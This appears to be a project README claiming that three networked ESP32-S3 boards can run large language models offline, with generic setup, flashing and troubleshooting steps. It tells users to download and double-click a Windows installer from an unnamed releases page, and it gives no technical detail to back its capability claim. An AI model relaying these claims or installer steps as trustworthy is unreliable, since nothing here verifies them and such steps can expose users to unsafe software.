🧠 esp32s3-distributed-ai - Run large language models on hardware

ℹ️ What is this software

This project allows you to run artificial intelligence models on small, low-power microcontrollers. You can use three ESP32-S3 boards to work together. This system splits the memory load across the devices. It operates completely offline. You do not need a constant internet connection to process language tasks once you set up the boards.

⚙️ System requirements

To use this software, you need the following items:

  • Three ESP32-S3 development boards.
  • A Windows computer to flash the software.
  • USB cables to connect the boards to your computer.
  • A stable power supply for your boards.

📥 Setup and installation

Follow these steps to prepare your system:

  1. Visit the official releases page to download the latest setup file.
  2. Save the installer to your desktop.
  3. Double-click the file to start the installation.
  4. Follow the prompts on your screen to complete the setup.

🔌 Connecting your boards

Each ESP32-S3 board requires specific programming to act as a node in the network. Connect your first board via USB. Open the application you installed. The software detects the board automatically. Select the correct model file provided in the software package. Click the upload button. Repeat this process for the second and third boards. Ensure each board remains connected until the progress bar reaches one hundred percent.

🚀 Running the system

Once you flash all three boards, unplug them from the computer. Power the boards using a standard wall adapter or battery pack. The devices will communicate using wireless signals. Place them within reasonable distance of each other to ensure a stable connection. The system starts processing automatically upon receiving input.

🛠️ Troubleshooting common issues

If the boards fail to communicate, check your power source. Low voltage causes connectivity errors. Ensure the boards are not enclosed in thick metal cases that block wireless signals. If a board shows a red light, reset the device by pressing the onboard button. This clears the memory and forces a reconnection to the network.

📈 Performance tips

The system works best when boards stay close together. Keep the units within five feet of each other for peak speed. Avoid placing the units near heavy electronics that create electrical noise. This interference slows down data transfer between the three units.
